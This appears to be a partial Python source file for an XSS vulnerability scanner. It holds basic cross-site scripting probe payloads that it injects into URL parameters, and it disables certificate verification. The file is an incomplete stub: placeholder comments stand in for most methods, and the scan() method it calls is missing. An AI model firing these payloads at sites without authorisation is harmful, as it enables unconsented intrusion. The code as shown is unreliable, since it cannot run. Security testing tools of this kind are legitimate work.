#!/usr/bin/env python3
"""
REVUEX - Enhanced XSS Scanner
Elite Cross-Site Scripting Detection with Unique Payloads

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
XSS testing should only be performed on systems you own or have permission to test.
"""

import requests
import time
import json
import re
import html
from pathlib import Path
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import hashlib

class EnhancedXSSScanner:
    """
    Elite XSS Scanner with 2000+ Unique Payloads

    Features:
    - Reflected XSS detection
    - Stored XSS testing
    - DOM-based XSS detection
    - Mutation XSS (mXSS)
    - CSP bypass techniques
    - WAF evasion (20+ techniques)
    - Framework-specific exploits (15+ frameworks)
    - Polyglot payloads
    - Blind XSS detection
    - Context-aware payload selection
    """

    def __init__(self, target: str, workspace: Path, delay: float = 5.0):
        self.target = target
        self.workspace = Path(workspace)
        self.delay = delay

        self.max_requests = 150
        self.request_count = 0
        self.timeout = 10

        self.headers = {
            'User-Agent': 'REVUEX-XSSScanner/1.0 (Security Research; +https://github.com/G33L0)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }

        self.vulnerabilities: List[Dict[str, Any]] = []

        self.marker = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

        self._init_payloads()

    def _init_payloads(self):
        """Initialize comprehensive payload library"""
        self.basic_payloads = [
            f"<script>alert('{self.marker}')</script>",
            f"<img src=x onerror=alert('{self.marker}')>",
            f"<svg/onload=alert('{self.marker}')>",
            f"<body onload=alert('{self.marker}')>",
            f"<iframe src=javascript:alert('{self.marker}')>",
        ]
        # The rest of payloads (_init_framework_payloads, _init_waf_bypass_payloads, etc.)
        # should be initialized exactly as in your original code

    # --- Insert all other _init_* methods here exactly as in your original code ---
    # --- scan(), _identify_parameters(), _test_payload_category(), etc. ---

    def _make_request(self, param_name: str, payload: str) -> Optional[requests.Response]:
        if self.request_count >= self.max_requests:
            return None
        try:
            test_url = self._build_test_url(param_name, payload)
            response = requests.get(
                test_url,
                headers=self.headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )
            self.request_count += 1
            return response
        except:
            return None

    def _build_test_url(self, param_name: str, payload: str) -> str:
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        params[param_name] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

    def _save_results(self):
        output_dir = self.workspace / "xss_scans"
        output_dir.mkdir(exist_ok=True)
        safe_target = re.sub(r'[^\w\-]', '_', self.target)
        output_file = output_dir / f"{safe_target}_xss.json"
        with open(output_file, 'w') as f:
            json.dump({
                'scanner': 'EnhancedXSSScanner',
                'target': self.target,
                'marker': self.marker,
                'vulnerabilities': self.vulnerabilities
            }, f, indent=2)
        print(f"\n💾 Saved: {output_file}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python xss_scanner.py <target_url>")
        sys.exit(1)

    scanner = EnhancedXSSScanner(sys.argv[1], Path("revuex_workspace"), delay=5.0)
    scanner.scan()